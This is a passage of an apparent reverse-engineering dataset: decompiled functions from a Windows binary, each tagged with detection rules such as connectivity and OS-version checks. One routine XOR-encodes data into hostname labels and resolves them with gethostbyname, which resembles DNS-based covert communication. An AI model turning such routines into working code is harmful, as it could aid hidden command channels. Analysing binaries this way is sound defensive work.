return;\n}\n",
        "token_count": 369
    },
    "20017e24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.20017e24(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint s;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint s2;\n    uint var_30h;\n    uint s1;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x200324f8, 0x124);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x38) = 0;\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    sub.ntdll.dll_memset(unaff_EBP + -0x134, 0, 0xcc);\n    *(unaff_EBP + -0x134) = 0x200466e4;\n    iVar2 = fcn.200135e2(*(iVar1 + 0xc), unaff_EBP + -0x34, unaff_EBP + -0x3c, 600000, 0);\n    if (iVar2 != 0) {\n        if ((((iVar2 != 0x21590003) && (iVar2 != 0x21590002)) && (*(*(iVar1 + 0x10) + 0x38) == 0)) &&\n           (pcVar4 = *(*(iVar1 + 0x10) + 0x15c),  pcVar4 != NULL)) {\n            (*pcVar4)(*(iVar1 + 0x14), iVar2, 1);\n        }\n        goto code_r0x2001814b;\n    }\n    if (*(unaff_EBP + -0x3c) < 0xc) {\ncode_r0x20017eb6:\n        *(unaff_EBP + 8) = 0x2159000a;\n        if ((*(*(iVar1 + 0x10) + 0x38) == 0) && (pcVar4 = *(*(iVar1 + 0x10) + 0x15c),  pcVar4 != NULL)) {\n            (*pcVar4)(*(iVar1 + 0x14), 0x2159000a, 5);\n        }\n    }\n    else {\n        sub.ntdll.dll_memcpy(unaff_EBP + -0x2c, *(unaff_EBP + -0x34), 0xc);\n        pcVar4 = _sym.imp.WS2_32.dll_ntohl;\n        uVar3 = (*_sym.imp.WS2_32.dll_ntohl)(*(unaff_EBP + -0x2c));\n        *(unaff_EBP + -0x2c) = uVar3;\n        uVar3 = (*pcVar4)(*(unaff_EBP + -0x28));\n        *(unaff_EBP + -0x28) = uVar3;\n        if ((*(unaff_EBP + -0x24) != '\\0') && (*(unaff_EBP + -0x24) != '\\x01')) goto code_r0x20017eb6;\n        *(unaff_EBP + -0x130) = iVar1;\n        *(unaff_EBP + -0x128) = *(unaff_EBP + -0x2c);\n        if (*(unaff_EBP + -0x24) != '\\x01') {\n            *(unaff_EBP + -300) = 1;\n        }\n        *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x34);\n        if (*(*(iVar1 + 0x10) + 0x170) == 0) {\n            iVar2 = fcn.200136d0(*(iVar1 + 0xc), 9, 0, 0, 0);\n            if (iVar2 == 0) {\n                *(unaff_EBP + -0x30) = 1;\n            }\n            else {\n                if (*(*(iVar1 + 0x10) + 0x174) != 0) {\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    goto code_r0x20017f85;\n                }\n                *(unaff_EBP + -0x30) = 0;\n            }\n            *(unaff_EBP + -0x1c) = 0;\ncode_r0x20017f8a:\n            *(unaff_EBP + -4) = 0;\n            uVar3 = (**(*(iVar1 + 0x10) + 0x30))\n                              (unaff_EBP + -0x134, *(unaff_EBP + -0x28), *(unaff_EBP + -0x34) + 0xc, \n                               *(unaff_EBP + -0x3c) + -0xc, unaff_EBP + -0x20, unaff_EBP + -0x38, \n                               *(*(iVar1 + 0x10) + 0x34));\n            *(unaff_EBP + -0x1c) = uVar3;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*(unaff_EBP + -0x30) != 0) {\n                fcn.200136d0(*(iVar1 + 0xc), 10, 0, 0, 0);\n            }\n        }\n        else {\n            *(unaff_EBP + -0x30) = 0;\n            *(unaff_EBP + -0x1c) = 0;\ncode_r0x20017f85:\n            if (*(unaff_EBP + -0x1c) == 0) goto code_r0x20017f8a;\n        }\n        do {\n            iVar2 = fcn.200135e2(*(iVar1 + 0xc), unaff_EBP + -0x40, unaff_EBP + -0x44, 0, 0);\n            *(unaff_EBP + 8) = iVar2;\n            if (iVar2 != 0) break;\n            fcn.20013299(*(iVar1 + 0xc), *(unaff_EBP + -0x40));\n        } while (0 < *(unaff_EBP + -0x44));\n        if (*(unaff_EBP + 8) == 0x21590002) {\n            sub.ntdll.dll_memset(unaff_EBP + -0x2c, 0, 0xc);\n            *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x128);\n            *(unaff_EBP + -0x28) = *(unaff_EBP + -0x1c);\n            *(unaff_EBP + -0x24) = 2;\n            pcVar4 = _sym.imp.WS2_32.dll_htonl;\n            uVar3 = (*_sym.imp.WS2_32.dll_htonl)(*(unaff_EBP + -0x128));\n            *(unaff_EBP + -0x2c) = uVar3;\n            uVar3 = (*pcVar4)(*(unaff_EBP + -0x28));\n            *(unaff_EBP + -0x28) = uVar3;\n            sub.ntdll.dll_memset(unaff_EBP + -100, 0, 0x20);\n            *(unaff_EBP + -0x5c) = 0xc;\n            *(unaff_EBP + -0x60) = unaff_EBP + -0x2c;\n            if (*(unaff_EBP + -0x78) == 0) {\n                *(unaff_EBP + -100) = unaff_EBP + -0x54;\n            }\n            else {\n                *(unaff_EBP + -100) = *(unaff_EBP + -0x78);\n                **(unaff_EBP + -0x74) = unaff_EBP + -0x54;\n            }\n            *(unaff_EBP + -0x4c) = *(unaff_EBP + -0x38);\n            *(unaff_EBP + -0x50) = *(unaff_EBP + -0x20);\n            uVar3 = fcn.20013845(*(iVar1 + 0xc), unaff_EBP + -100, 0);\n            *(unaff_EBP + 8) = uVar3;\n        }\n        if (*(unaff_EBP + 8) == 0x21590003) {\n            *(unaff_EBP + 8) = 0x21590006;\n        }\n        iVar2 = *(iVar1 + 0x10);\n        if (*(unaff_EBP + 8) == 0) {\n            pcVar4 = *(iVar2 + 0x16c);\n        }\n        else {\n            if ((*(iVar2 + 0x38) == 0) && (*(iVar2 + 0x15c) != NULL)) {\n                (**(iVar2 + 0x15c))(*(iVar1 + 0x14), *(unaff_EBP + 8), 2);\n            }\n            pcVar4 = *(*(iVar1 + 0x10) + 0x168);\n        }\n        if (pcVar4 != NULL) {\n            (*pcVar4)(*(iVar1 + 0x14), *(unaff_EBP + -0x70), *(unaff_EBP + -0x1c), *(unaff_EBP + -0x20), \n                      *(unaff_EBP + -0x38));\n        }\n        fcn.2001785a(unaff_EBP + -0x134);\n    }\n    pcVar4 = _sym.imp.msvcrt.dll_free;\n    (*_sym.imp.msvcrt.dll_free)(*(unaff_EBP + -0x20));\n    (*pcVar4)(*(unaff_EBP + -0x70));\n    if (*(iVar1 + 0xc) != 0) {\n        fcn.20013299(*(iVar1 + 0xc), *(unaff_EBP + -0x34));\n    }\ncode_r0x2001814b:\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 2453
    },
    "200185b1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200185b1(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    \n    if (arg_10h != 0) {\n        if ((arg_ch == 0xf) && (arg_14h == 0xc)) {\n            uVar1 = fcn.20018210(arg_8h);\n        }\n        else {\n            puVar2 = (*_sym.imp.msvcrt.dll_malloc)(arg_14h + 0x14);\n            if (puVar2 == NULL) {\n                uVar1 = 0x21590004;\n            }\n            else {\n                sub.ntdll.dll_memcpy(puVar2 + 5, arg_10h, arg_14h);\n                puVar2[3] = arg_14h;\n                puVar2[2] = arg_ch;\n                puVar2[1] = 1;\n                puVar2[4] = arg_18h;\n                fcn.20001567(arg_8h + 0x68);\n                *puVar2 = *(arg_8h + 100);\n                *(arg_8h + 100) = puVar2;\n                fcn.2000157d(arg_8h + 0x68);\n                uVar1 = 0;\n            }\n        }\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 332
    },
    "20018707": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.20018707(uint *arg_8h)\n\n{\n    code *pcVar1;\n    uint *arg_8h_00;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    pcVar1 = *(arg_8h[4] + 0x160);\n    var_4h = 0;\n    if (pcVar1 != NULL) {\n        iVar2 = (*pcVar1)(*(arg_8h[4] + 0x34), arg_8h + 5);\n        if (iVar2 != 0) {\n            *arg_8h = 3;\n            if (*(arg_8h[4] + 0x15c) == NULL) {\n                return 0;\n            }\n            (**(arg_8h[4] + 0x15c))(arg_8h[5], iVar2, 4);\n            return 0;\n        }\n    }\n    arg_8h[3] = 0;\n    do {\n        if (arg_8h_00[3] == 0) {\n            while( true ) {\n                *arg_8h_00 = 1;\n                fcn.20001567(arg_8h_00[4] + 0x18);\n                if (*(arg_8h_00[4] + 0x38) != 0) break;\n                iVar2 = fcn.20013311(*(arg_8h_00[4] + 0x14), arg_8h_00 + 3, 0);\n                fcn.2000157d(arg_8h_00[4] + 0x18);\n                if (iVar2 == 0) goto code_r0x200187e4;\n                *arg_8h_00 = 3;\n                if ((*(arg_8h_00[4] + 0x38) == 0) && (pcVar1 = *(arg_8h_00[4] + 0x15c),  pcVar1 != NULL)) {\n                    (*pcVar1)(arg_8h_00[5], iVar2, 0);\n                }\n                if (*(arg_8h_00[4] + 0x38) != 0) goto code_r0x200187e4;\n                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n            }\n            fcn.2000157d(arg_8h_00[4] + 0x18);\ncode_r0x200187e4:\n            if (*(arg_8h_00[4] + 0x38) != 0) {\n                fcn.20013237(arg_8h_00 + 3, 0);\n                pcVar1 = *(arg_8h_00[4] + 0x164);\n                if (pcVar1 != NULL) {\n                    (*pcVar1)(*(arg_8h_00[4] + 0x34), arg_8h_00[5]);\n                }\n                return 0;\n            }\n            fcn.20001567(arg_8h_00[4] + 0x144);\n            arg_8h = 0xffffffff;\n            *arg_8h_00 = 2;\n            var_4h = 0;\n            iVar2 = 0;\n            piVar3 = arg_8h_00[4] + 0x3c;\n            do {\n                if (*piVar3 == 1) {\n                    var_4h = var_4h + 1;\n                }\n                else if ((*piVar3 == 0) && (arg_8h == 0xffffffff)) {\n                    arg_8h = iVar2;\n                }\n                iVar2 = iVar2 + 1;\n                piVar3 = piVar3 + 6;\n            } while (iVar2 < 0xb);\n            if ((var_4h == 0) && (arg_8h != 0xffffffff)) {\n                iVar2 = arg_8h_00[4] + arg_8h * 0x18;\n                iVar2 = fcn.20001cfb(iVar2 + 0x40, fcn.20018707, iVar2 + 0x3c);\n                if (iVar2 == 0) {\n                    *(arg_8h_00[4] + 0x3c + arg_8h * 0x18) = 1;\n                    var_4h = 1;\n                }\n            }\n            fcn.2000157d(arg_8h_00[4] + 0x144);\n        }\n        pcVar1 = _sym.imp.WS2_32.dll_htonl;\n        if (var_4h == 0) {\n            var_8h._0_1_ = 5;\n            var_ch = 0x21590007;\n            var_10h = (*_sym.imp.WS2_32.dll_htonl)(var_10h);\n            var_ch = (*pcVar1)(var_ch);\n            fcn.20013589(arg_8h_00[3], &var_10h, 0xc, 0);\n            fcn.20013237(arg_8h_00 + 3, 0);\n            if (*(arg_8h_00[4] + 0x15c) != NULL) {\n                (**(arg_8h_00[4] + 0x15c))(arg_8h_00[5], 0x21590007, 3);\n            }\n        }\n        else {\n            iVar2 = fcn.20017e24(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.20013237(arg_8h_00 + 3, 0);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1328
    },
    "20018f63": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20018f63(int32_t arg_8h, int32_t *ptr, int32_t *arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        if (*(arg_8h + 0x24) == 0) {\n            *arg_10h = 0;\n            puVar1 = arg_8h + 4;\n            var_4h = 4;\n            iVar2 = fcn.200232ea(*puVar1, arg_10h, &var_4h, arg_14h, 1);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.WS2_32.dll_ntohl)(*arg_10h);\n                *arg_10h = iVar2;\n                if (iVar2 < 0) {\n                    iVar2 = 0x2159000a;\n                }\n                else {\n                    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(iVar2);\n                    *ptr = iVar2;\n                    if (iVar2 != 0) {\n                        if (*arg_10h == 0) {\n                            return 0;\n                        }\n                        if ((arg_18h & 1) == 0) {\n                            arg_14h = 60000;\n                        }\n                        iVar2 = fcn.200232ea(*puVar1, iVar2, arg_10h, arg_14h, 1);\n                        if (iVar2 == 0) {\n                            return 0;\n                        }\n                        (*_sym.imp.msvcrt.dll_free)(*ptr);\n                        *ptr = 0;\n                        *(arg_8h + 0x20) = 1;\n                        fcn.20022f7c(puVar1, 0);\n                        return iVar2;\n                    }\n                    iVar2 = 0x21590004;\n                }\n                fcn.20022f7c(puVar1, 0);\n                *(arg_8h + 0x20) = 1;\n            }\n        }\n        else {\n            *arg_10h = 0x800;\n            iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x800);\n            *ptr = iVar2;\n            if (iVar2 == 0) {\n                iVar2 = 0x21590004;\n            }\n            else {\n                iVar2 = fcn.200232ea(*(arg_8h + 4), iVar2, arg_10h, arg_14h, 0);\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                (*_sym.imp.msvcrt.dll_free)(*ptr);\n                *ptr = 0;\n            }\n            *arg_10h = 0;\n        }\n    }\n    else {\n        iVar2 = 0x21590065;\n    }\n    return iVar2;\n}\n",
        "token_count": 659
    },
    "200190f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.200190f3(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    \n    var_10h = arg_ch;\n    iVar1 = arg_8h;\n    if (*(arg_8h + 0x24) == 0) {\n        iVar3 = 0;\n        arg_8h = 0;\n        piVar2 = arg_ch;\n        if (arg_ch != NULL) {\n            do {\n                iVar3 = iVar3 + piVar2[2];\n                piVar2 = *piVar2;\n                arg_8h = iVar3;\n            } while (piVar2 != NULL);\n        }\n        arg_8h = (*_sym.imp.WS2_32.dll_htonl)(arg_8h);\n        sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n        var_ch = &arg_8h;\n        var_8h = 4;\n        fcn.2002344f(*(iVar1 + 4), &var_10h, arg_10h);\n    }\n    else {\n        fcn.2002344f(*(arg_8h + 4), arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "200197f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.200197f4(uint param_1, uint32_t param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    uint16_t *puVar11;\n    uint16_t *puVar12;\n    uint16_t *puVar13;\n    uint16_t *puVar14;\n    uint16_t *puVar15;\n    uint16_t uVar16;\n    uint16_t *in_EAX;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    uint32_t var_4h;\n    \n    uVar17 = 0;\n    if (0x1f < param_2) {\n        uVar18 = param_2 >> 5;\n        param_2 = param_2 + uVar18 * -0x20;\n        do {\n            puVar1 = in_EAX + 0xe;\n            puVar2 = in_EAX + 0xf;\n            puVar3 = in_EAX + 0xd;\n            puVar4 = in_EAX + 0xc;\n            puVar5 = in_EAX + 0xb;\n            puVar6 = in_EAX + 10;\n            puVar7 = in_EAX + 9;\n            puVar8 = in_EAX + 8;\n            puVar9 = in_EAX + 7;\n            puVar10 = in_EAX + 6;\n            puVar11 = in_EAX + 5;\n            puVar12 = in_EAX + 4;\n            puVar13 = in_EAX + 3;\n            puVar14 = in_EAX + 2;\n            puVar15 = in_EAX + 1;\n            uVar16 = *in_EAX;\n            in_EAX = in_EAX + 0x10;\n            uVar18 = uVar18 - 1;\n            uVar17 = uVar16 + uVar17 +\n                     *puVar2 + *puVar1 + *puVar3 + *puVar4 + *puVar5 + *puVar6 + *puVar7 + *puVar8 + *puVar9 + *puVar10\n                     + *puVar11 + *puVar12 + *puVar13 + *puVar14 + *puVar15;\n        } while (uVar18 != 0);\n    }\n    if (7 < param_2) {\n        uVar18 = param_2 >> 3;\n        param_2 = param_2 + uVar18 * -8;\n        do {\n            puVar1 = in_EAX + 2;\n            puVar2 = in_EAX + 3;\n            puVar3 = in_EAX + 1;\n            uVar16 = *in_EAX;\n            in_EAX = in_EAX + 4;\n            uVar18 = uVar18 - 1;\n            uVar17 = uVar16 + uVar17 + *puVar2 + *puVar1 + *puVar3;\n        } while (uVar18 != 0);\n    }\n    if (1 < param_2) {\n        iVar19 = (param_2 - 2 >> 1) + 1;\n        param_2 = param_2 + iVar19 * -2;\n        do {\n            uVar17 = uVar17 + *in_EAX;\n            in_EAX = in_EAX + 1;\n            iVar19 = iVar19 + -1;\n        } while (iVar19 != 0);\n    }\n    if (param_2 == 1) {\n        var_4h = *in_EAX;\n        uVar17 = uVar17 + var_4h;\n    }\n    uVar17 = (uVar17 >> 0x10) + (uVar17 & 0xffff);\n    return ~((uVar17 >> 0x10) + uVar17);\n}\n",
        "token_count": 919
    },
    "20019efc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20019efc(int32_t arg_8h, uint8_t **arg_ch, uint32_t *arg_10h, uint arg_14h, int32_t s2, uint n, uint *s1, \n            int32_t *arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t arg_30h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t *arg_8h_00;\n    uint var_94h;\n    uint var_14h;\n    int32_t var_ch;\n    int32_t netlong;\n    uint8_t *ptr;\n    \n    ptr = NULL;\n    do {\n        while( true ) {\n            do {\n                do {\n                    do {\n                        do {\n                            (*_sym.imp.msvcrt.dll_free)(ptr);\n                            if (s1 == NULL) {\n                                s1 = &var_94h;\n                            }\n                            iVar3 = fcn.20023632(*(arg_8h + 0x10), &ptr, &var_ch, arg_14h, s1);\n                            if (iVar3 != 0) {\n                                return iVar3;\n                            }\n                        } while (((s2 != 0) && (iVar3 = sub.ntdll.dll_memcmp(s1, s2, n),  iVar3 != 0)) || (ptr[9] != 1))\n                        ;\n                        uVar2 = *ptr;\n                        iVar3 = (uVar2 & 0xf) * 4;\n                    } while ((*(arg_8h + 0x18) != 0) &&\n                            ((ptr[iVar3] != *(arg_8h + 0x16) || (ptr[iVar3 + 1] != *(arg_8h + 0x17)))));\n                    puVar1 = ptr + iVar3 + 4;\n                    uVar4 = (*_sym.imp.WS2_32.dll_ntohs)(*(ptr + 2));\n                } while (((uVar4 & 0xffff) < iVar3 + 4U) ||\n                        (iVar3 = (uVar4 & 0xffff) + (uVar2 & 0xf) * -4 + 0xfffc,  iVar3 < 4));\n                sub.ntdll.dll_memcpy(&netlong, puVar1, 4);\n                netlong = (*_sym.imp.WS2_32.dll_ntohl)(netlong);\n                arg_8h_00 = puVar1 + 4;\n                uVar4 = iVar3 + 0xfffc;\n            } while ((arg_24h != NULL) && (netlong != *arg_24h));\n            if (arg_28h != NULL) {\n                *arg_28h = netlong;\n            }\n            if (arg_2ch == 0) goto code_r0x2001a059;\n            if (((0x15 < uVar4) && (iVar5 = fcn.2002388a(arg_8h_00, 0x16, &var_14h),  iVar5 != 0)) &&\n               (iVar5 = sub.ntdll.dll_memcmp(&var_14h, arg_2ch, 8),  iVar5 == 0)) break;\n            if (arg_30h != 0) goto code_r0x2001a059;\n        }\n    } while (arg_30h != 0);\n    arg_8h_00 = puVar1 + 0x1a;\n    uVar4 = iVar3 + 0x1ffe6;\ncode_r0x2001a059:\n    *arg_ch = arg_8h_00;\n    *(arg_8h_00 + -4) = var_ch - (uVar4 & 0xffff);\n    *arg_10h = uVar4 & 0xffff;\n    return 0;\n}\n",
        "token_count": 874
    },
    "2001a075": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001a075(char **arg_8h, uint32_t *arg_ch, uint arg_10h, int32_t s2, uint n, uint *s1, int32_t *arg_20h, \n            int32_t *arg_24h, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    char *arg_8h_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_94h;\n    uint var_14h;\n    int32_t netlong;\n    int32_t var_8h;\n    char *ptr;\n    \n    ptr = NULL;\n    do {\n        while( true ) {\n            do {\n                do {\n                    do {\n                        (*_sym.imp.msvcrt.dll_free)(ptr);\n                        if (s1 == NULL) {\n                            s1 = &var_94h;\n                        }\n                        iVar2 = fcn.20023632(*(unaff_EBX + 0x10), &ptr, &var_8h, arg_10h, s1);\n                        if (iVar2 != 0) {\n                            return iVar2;\n                        }\n                    } while (((s2 != 0) && (iVar2 = sub.ntdll.dll_memcmp(s1, s2, n),  iVar2 != 0)) ||\n                            ((pcVar1 = ptr,  *(unaff_EBX + 0x18) != 0 &&\n                             ((*ptr != *(unaff_EBX + 0x16) || (ptr[1] != *(unaff_EBX + 0x17)))))));\n                    uVar3 = var_8h - 8U & 0xffff;\n                } while (uVar3 < 4);\n                sub.ntdll.dll_memcpy(&netlong, ptr + 8, 4);\n                netlong = (*_sym.imp.WS2_32.dll_ntohl)(netlong);\n                arg_8h_00 = pcVar1 + 0xc;\n                uVar4 = uVar3 + 0xfffc;\n            } while ((arg_20h != NULL) && (netlong != *arg_20h));\n            if (arg_24h != NULL) {\n                *arg_24h = netlong;\n            }\n            if (arg_28h == 0) goto code_r0x2001a190;\n            if (((0x15 < uVar4) && (iVar2 = fcn.2002388a(arg_8h_00, 0x16, &var_14h),  iVar2 != 0)) &&\n               (iVar2 = sub.ntdll.dll_memcmp(&var_14h, arg_28h, 8),  iVar2 == 0)) break;\n            if (arg_2ch != 0) goto code_r0x2001a190;\n        }\n    } while (arg_2ch != 0);\n    arg_8h_00 = pcVar1 + 0x22;\n    uVar4 = uVar3 + 0x1ffe6;\ncode_r0x2001a190:\n    *arg_8h = arg_8h_00;\n    *(arg_8h_00 + -4) = var_8h - (uVar4 & 0xffff);\n    *arg_ch = uVar4 & 0xffff;\n    return 0;\n}\n",
        "token_count": 759
    },
    "2001a41e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.2001a41e(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, uint32_t *arg_18h, uint noname_5, \n            uint32_t arg_20h)\n\n{\n    uchar *puVar1;\n    int32_t *piVar2;\n    uchar uVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_1b0h;\n    uint var_b0h;\n    uint var_88h;\n    uint var_58h;\n    uint32_t var_2ch;\n    uchar var_28h;\n    uint var_27h;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar12 = ~arg_20h & 1;\n    var_8h = ~(arg_20h >> 1) & 1;\n    if ((uVar12 != 0) && (0x14 < arg_10h)) {\n        return 0x2159000b;\n    }\n    fcn.20001567(0x20047028);\n    while (uVar7 = (*_sym.imp.KERNEL32.dll_GetTickCount)(),  uVar7 / 10 == *0x20047044 / 10) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(5);\n    }\n    if (uVar12 == 0) {\n        iVar8 = fcn.200018bf();\n        var_4h = 5;\n        arg_10h = iVar8 % 0x14 + 1;\n        iVar8 = iVar8 % 0x14 + 6;\n        if (5 < iVar8) {\n            do {\n                uVar3 = fcn.200018bf();\n                iVar9 = var_4h + 1;\n                puVar1 = &var_2ch + var_4h;\n                var_4h = iVar9;\n                *puVar1 = uVar3;\n            } while (iVar9 < iVar8);\n        }\n    }\n    else {\n        sub.ntdll.dll_memcpy(&var_27h, arg_ch, arg_10h);\n    }\n    var_4h = uVar7 / 10 & 0xffff;\n    uVar5 = (*_sym.imp.WS2_32.dll_htons)(var_4h);\n    var_2ch._0_3_ = uVar5;\n    var_2ch = CONCAT13(*(arg_8h + 0xc), var_2ch);\n    var_28h = var_28h ^ ((uVar12 != 0) << 5 ^ var_28h) & 0x20;\n    iVar8 = 0;\n    var_28h = var_28h ^ ((var_8h != 0) << 6 ^ var_28h) & 0x40;\n    _var_28h = _var_28h & 0xffffff00 | var_28h ^ (var_28h ^ arg_10h) & 0x1f;\n    arg_10h = arg_10h + 5;\n    uVar4 = 0;\n    if (0 < arg_10h) {\n        do {\n            uVar4 = uVar4 + *(&var_2ch + iVar8);\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < arg_10h);\n    }\n    iVar8 = 0;\n    if (0 < arg_10h) {\n        do {\n            *(&var_2ch + iVar8) = *(&var_2ch + iVar8) ^ uVar4 >> 1;\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < arg_10h);\n    }\n    var_2ch._0_3_ = CONCAT12(uVar4, var_2ch);\n    var_2ch = var_2ch & 0xff000000 | var_2ch;\n    sub.ntdll.dll_memset(&var_58h, 0, 0x29);\n    iVar9 = fcn.200239ce(&var_2ch, arg_10h, &var_58h);\n    iVar8 = 0;\n    iVar11 = 0;\n    iVar13 = 0;\n    *(&var_58h + iVar9) = 0;\n    if (0 < iVar9) {\n        do {\n            if (((((iVar13 == 8) || (iVar13 == 0xc)) || (iVar13 == 0x10)) || (iVar13 == 0x14)) && (iVar13 < iVar9 + -1))\n            {\n                *(&var_88h + iVar11) = 0x2d;\n                iVar11 = iVar11 + 1;\n            }\n            *(&var_88h + iVar11) = *(&var_58h + iVar13);\n            iVar11 = iVar11 + 1;\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < iVar9);\n    }\n    *(&var_88h + iVar11) = 0;\n    fcn.200088de(\"%s.%s\", &var_88h);\n    iVar9 = (*_sym.imp.WS2_32.dll_gethostbyname)(&var_1b0h);\n    *0x20047044 = uVar7;\n    if (iVar9 == 0) {\n        arg_20h = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        if (*(arg_8h + 0x10) != 0) {\n            arg_20h = -(var_8h != 0) & 0x2159000e;\n        }\n    }\n    else {\n        piVar2 = *(iVar9 + 0xc);\n        iVar13 = 0;\n        uVar12 = 0;\n        iVar11 = *piVar2;\n        arg_20h = 0x2159000a;\n        while (iVar11 != 0) {\n            if ((*(iVar9 + 10) == 4) && (uVar12 < 10)) {\n                uVar10 = (*_sym.imp.WS2_32.dll_ntohl)(**(piVar2 + iVar13));\n                (&var_b0h)[uVar12] = uVar10;\n                uVar12 = uVar12 + 1;\n            }\n            piVar2 = 